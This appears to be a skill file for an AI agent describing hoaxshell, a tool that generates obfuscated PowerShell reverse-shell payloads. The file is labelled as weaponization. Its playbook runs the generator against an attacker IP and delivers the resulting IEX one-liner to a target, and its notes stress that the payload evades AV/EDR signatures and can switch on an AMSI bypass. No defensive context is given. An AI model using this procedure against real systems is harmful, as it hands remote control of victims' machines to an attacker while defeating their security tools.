---
name: hoaxshell-powershell
description: "hoaxshell creates PowerShell reverse sessions. Signals: payload development, weaponization, generate PS reverse payload, print-only generation, encrypted transport."
zh-signals: "hoaxshell: PowerShell 会话反弹。信号:载荷开发,武器化,生成 PS 反弹载荷,生成后仅打印,加密传输。"
when-to-use: >-
  Use when you need a PowerShell reverse shell without relying on a conventional listener;
  generate an obfuscated payload and deliver the IEX one-liner.
---

# hoaxshell

- Attack Category: C07 Payload Development and Weaponization
- Upstream Repository: https://github.com/t3l3machus/hoaxshell
- Upstream License: BSD-2-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/t3l3machus/hoaxshell && cd hoaxshell
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `sudo python3 hoaxshell.py -s <attacker_ip>` | Generate a PS reverse payload |
| `-g` | Print only after generation |
| `-t` | Encrypted transport |
| `-p 8080` | Port |
| `-i` | Interactive mode |
| `--exec-outfile` | Write to disk and execute |

## Attack Scenario Playbook

### PowerShell Session Reverse

```bash
sudo python3 hoaxshell.py -s 10.8.0.2
# Deliver the printed IEX one-liner to the target, the session upgrades automatically
```

## Notes

The generated IEX payload carries no msfvenom signature, so some AV/EDR products do not block it; supports TLS encryption and an AMSI bypass switch.
